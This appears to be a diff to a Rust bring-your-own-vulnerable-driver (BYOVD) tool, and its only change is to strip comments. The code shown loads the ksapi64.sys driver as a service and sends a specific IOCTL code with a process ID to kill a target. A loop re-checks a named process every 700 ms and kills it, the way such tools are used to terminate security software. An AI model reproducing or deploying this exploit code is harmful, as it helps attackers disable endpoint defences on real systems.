@@ -29,7 +29,7 @@ const MAX_PATH: usize = 260;
 
 struct BYOVD_TEMPLATE;
 
-// Define the trait for driver interaction
+
 trait Driver {
     type IoctlStruct;
 
@@ -40,10 +40,10 @@ trait Driver {
     fn create_ioctl_struct(pid: DWORD) -> Self::IoctlStruct;
 }
 
-// Define the struct for the IOCTL call
+
 #[repr(C, packed)]
 struct BYOVD_TEMPLATEIoctlStruct {
-    pid: DWORD, // PID
+    pid: DWORD, 
 }
 
 impl BYOVD_TEMPLATEIoctlStruct {
@@ -56,19 +56,19 @@ impl Driver for BYOVD_TEMPLATE {
     type IoctlStruct = BYOVD_TEMPLATEIoctlStruct;
 
     fn driver_name() -> &'static str {
-        "ksapi64" // Replace with your driver name
+        "ksapi64" 
     }
 
     fn driver_path() -> &'static str {
-        "\\ksapi64.sys" // Replace with your driver path
+        "\\ksapi64.sys" 
     }
 
     fn device_name() -> &'static str {
-        "\\\\.\\ksapi64_dev" // Replace with your device name
+        "\\\\.\\ksapi64_dev" 
     }
 
     fn ioctl_code() -> DWORD {
-        2237504 // Replace with your IOCTL code
+        2237504 
     }
 
     fn create_ioctl_struct(pid: DWORD) -> Self::IoctlStruct {
@@ -77,7 +77,7 @@ impl Driver for BYOVD_TEMPLATE {
 }
 
 
-// BYOVD struct and methods
+
 struct BYOVD<D: Driver> {
     h_sc: SC_HANDLE,
     h_service: SC_HANDLE,
@@ -256,7 +256,7 @@ impl<D: Driver> BYOVD<D> {
             println!("[X] Failed to immediately stop the service.");
         }
 
-        // Attempt to delete the service
+        
         let delete_result = unsafe {
             DeleteService(h_service)
         };
@@ -267,7 +267,7 @@ impl<D: Driver> BYOVD<D> {
             println!("[!] Service marked for deletion.");
         }
 
-        // Close handles regardless of the outcomes
+        
         unsafe {
             CloseServiceHandle(h_service);
             CloseServiceHandle(h_sc);
@@ -296,19 +296,19 @@ impl<D: Driver> BYOVD<D> {
             return;
         }
 
-        let mut output_buffer: DWORD = 0; // Output buffer to receive data from the driver
-        let mut bytes_returned: DWORD = 0; // Bytes returned
+        let mut output_buffer: DWORD = 0; 
+        let mut bytes_returned: DWORD = 0; 
 
         let ioctl_result = unsafe {
             DeviceIoControl(
-                h_driver as HANDLE, // Handle to the device
-                D::ioctl_code(), // IOCTL code
-                &mut driver_ioctl as *mut _ as LPVOID, // Pointer to input buffer
-                mem::size_of::<D::IoctlStruct>() as DWORD, // Size of input buffer
-                &mut output_buffer as *mut _ as LPVOID, // Pointer to output buffer
-                mem::size_of::<DWORD>() as DWORD, // Size of output buffer
-                &mut bytes_returned, // Pointer to variable that receives the byte count
-                std::ptr::null_mut(), // Overlapped (not used here)
+                h_driver as HANDLE, 
+                D::ioctl_code(), 
+                &mut driver_ioctl as *mut _ as LPVOID, 
+                mem::size_of::<D::IoctlStruct>() as DWORD, 
+                &mut output_buffer as *mut _ as LPVOID, 
+                mem::size_of::<DWORD>() as DWORD, 
+                &mut bytes_returned, 
+                std::ptr::null_mut(), 
             )
         };
 
@@ -391,7 +391,7 @@ fn main() {
         Some(name) => name,
         None => {
             eprintln!("[X] No process name provided");
-            return; // Exit the loop when no process name is provided
+            return; 
         },
     };
 
@@ -425,7 +425,7 @@ fn main() {
         println!("[!] Press Ctrl+C to stop the program.");
 
         loop {
-            // Sleep for a duration before the next iteration
+            
             sleep(Duration::from_millis(700));
             if !continue_loop.load(Ordering::SeqCst) {
                 break;
@@ -434,7 +434,7 @@ fn main() {
             let pid = match get_pid_by_name(process_name) {
                 Some(pid) => pid,
                 None => {
-                    continue; // Continue checking for the process
+                    continue; 
                 },
             };
             println!("[!] Killing process with PID: {}", pid);
